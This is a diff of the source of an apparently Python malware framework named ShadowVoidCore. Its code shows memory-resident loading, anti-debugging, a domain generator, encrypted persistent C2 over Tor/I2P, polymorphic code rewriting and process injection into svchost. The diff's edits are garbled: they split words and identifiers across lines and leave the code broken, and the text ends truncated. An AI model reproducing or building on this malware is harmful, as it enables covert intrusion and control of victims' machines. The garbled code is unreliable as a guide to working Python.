@@ -81,6 +81,7 @@ CONFIG = {
         'wireless': {'enabled': True, 'path': 'modules.wireless'},
         'net': {'enabled': True, 'path': 'modules.net'},
         'web': {'enabled': True, 'path': 'modules.web'},
+        
         'onion': {'enabled': True, 'path': 'modules.onion'},
         'post_exploit': {'enabled': True, 'path': 'modules.post_exploit'},
         'process_injection': {'enabled': True, 'path': 'modules.process_injection'}
@@ -153,6 +154,7 @@ def make_memory_resident():
 
         memory_loader = MemoryModuleLoader()
         if
+
  memory_loader not in sys.meta_path:
             sys.meta_path.insert(0, memory_loader)
         return True
@@ -207,7 +209,8 @@ def load_modules():
                         spec.loader.exec_module(module)
                         MODULES[name] = module
             except Exception as e:
-                print('Fai
+                print('Fa
+i
 led to load module ' + name + ': ' + str(e))
 
 
@@ -284,7 +287,8 @@ def anti_debug_check():
         if platform.system() == 'Linux':
             with open('/proc/self/status', 'r') as f:
                 for line in f:
-                    if line.sta
+                    if line.s
+ta
 rtswith('TracerPid:'):
                         pid = int(line.split()[1])
                         if pid != 0:
@@ -344,7 +348,8 @@ class AES256GCM:
             from Crypto.Cipher import AES
             nonce = os.urandom(self.nonce_size)
             cipher = AES.new(self.key, AES.MODE_GCM, nonce=nonce)
-            cipher
+            cip
+her
 text, tag = cipher.encrypt_and_digest(plaintext)
             return nonce + tag + ciphertext
         except ImportError:
@@ -394,7 +399,8 @@ class DomainGenerator:
 
 # C2 Connection Manager
 class C2Connection:
-    """Persistent C2 c
+    """Persistent 
+C2 c
 onnection with automatic Tor/I2P fallback"""
     
     def __init__(self, core):
@@ -445,7 +451,8 @@ onnection with automatic Tor/I2P fallback"""
             return False
 
     def make_request(self, url, method='GET', data=None, headers=None, encrypt=True):
-        """Make a request through C2 connection with automatic fallb
+        """Make a request through C2 connection with automatic 
+fallb
 ack"""
         try:
             if not self.connected:
@@ -499,7 +506,8 @@ ack"""
         return True
 
     def _persistent_loop(self):
-        """Persistent connection loo
+        """Persistent connecti
+on loo
 p"""
         while self.running:
             try:
@@ -560,7 +568,8 @@ class I2PRouter:
                 return result.returncode == 0
             return False
         except:
-            retu
+         
+   retu
 rn False
 
     def make_request(self, url, method='GET', data=None, headers=None, timeout=30):
@@ -619,7 +628,8 @@ class HeartbeatManager:
         self.jitter = jitter
         self.kill_switch = kill_switch
         self.running = False
-        self.last_heartbe
+        self.last
+_heartbe
 at = datetime.now()
         self.cipher = AES256GCM(generate_key())
         self.c2_connection = c2_connection
@@ -674,7 +684,8 @@ at = datetime.now()
             return True
         return False
 
-    def stop(self):
+    def st
+op(self):
 
         self.running = False
 
@@ -740,7 +751,8 @@ def polymorphic_code(original_code):
                     if node.id in self.var_map:
                         node.id = self.var_map[node.id]
                 return node
-        tree 
+   
+     tree 
 = VariableRenamer().visit(tree)
         return astunparse.unparse(tree)
     except:
@@ -806,7 +818,8 @@ class ShadowVoidCore:
             pass
 
     def initialize_memory_resident(self):
-        """Init
+    
+    """Init
 ialize memory-resident execution capability"""
         try:
             make_memory_resident()
@@ -851,7 +864,8 @@ ialize memory-resident execution capability"""
 
     def start_session(self):
         SESSION['active'] = True
-        SESSION[
+    
+    SESSION[
 'start_time'] = datetime.now()
         SESSION['targets'] = []
         SESSION['compromised'] = []
@@ -910,7 +924,8 @@ ialize memory-resident execution capability"""
 
     def cmd_scan(self, args):
         if not args:
-            return {'status': 'error', 'message': 'Target required'
+            return {'status': 'error', 'message': 'Tar
+get required'
 }
         target = args[0]
         scan_type = args[1] if len(args) > 1 else 'full'
@@ -954,7 +969,8 @@ ialize memory-resident execution capability"""
             target = args[1] if len(args) > 1 else 'svchost'
             return injector.migrate_to_process(target)
         elif subcmd == 'spawn':
-            target = args[1] if len(args) > 1 else 'svcho
+            target = args[1] if len(args) >
+ 1 else 'svcho
 st'
             return injector.spawn_and_inject(target)
         elif subcmd == 'list':
@@ -973,6 +989,5 @@ st'
             return {'status': 'error', 'message': 'Source and destination required'}
         source = args[0]
         destination = args[1]
-        channe
 
 ... [Content truncated]
